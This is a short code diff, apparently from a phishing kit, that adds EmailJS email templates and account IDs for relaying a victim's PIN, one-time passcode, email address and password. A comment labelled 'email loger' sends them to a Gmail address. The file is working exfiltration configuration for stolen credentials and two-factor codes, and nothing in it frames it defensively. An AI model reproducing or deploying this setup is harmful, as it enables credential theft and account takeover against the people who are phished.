@@ -1,0 +1,31 @@
+// Pin and otp templates
+
+Hello {{to_name}},
+
+Pin : {{pin}}
+
+OTP : {{otp}}
+
+
+// email and password templates
+
+Hello {{to_name}},
+
+You got a new email from {{username}}:
+
+and Password {{password}}
+
+ 
+// pin and otp account template details
+const serviceId = "service_gbqs03k";
+const userId = "GJOAxugp8HNQVOYft";
+const templateId = "template_1iict5x";
+
+
+// email and password account template details
+const serviceId = "service_gbqs03k";
+const userId = "GJOAxugp8HNQVOYft";
+const templateId = "template_hb9o6we";
+
+// email loger
+ to_name: "painkiller43211@gmail.com",
